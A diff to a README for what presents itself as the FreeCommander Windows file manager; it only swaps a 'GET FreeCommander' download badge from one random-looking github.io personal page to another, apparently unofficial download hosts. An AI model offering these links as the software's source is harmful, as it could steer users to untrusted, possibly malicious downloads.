@@ -1,6 +1,6 @@
 # FreeCommander - Windows File Manager
 
-[![GET FreeCommander](https://img.shields.io/badge/GET%20%E2%80%94%20FreeCommander-0078D6?style=for-the-badge&logoColor=white)](https://sofiaquluf502.github.io/.github/freecommander-xe)
+[![GET FreeCommander](https://img.shields.io/badge/GET%20%E2%80%94%20FreeCommander-0078D6?style=for-the-badge&logoColor=white)](https://ezrahhilljned.github.io/.github/freecommander-xe)
 
 ## What FreeCommander Brings to File Management
 
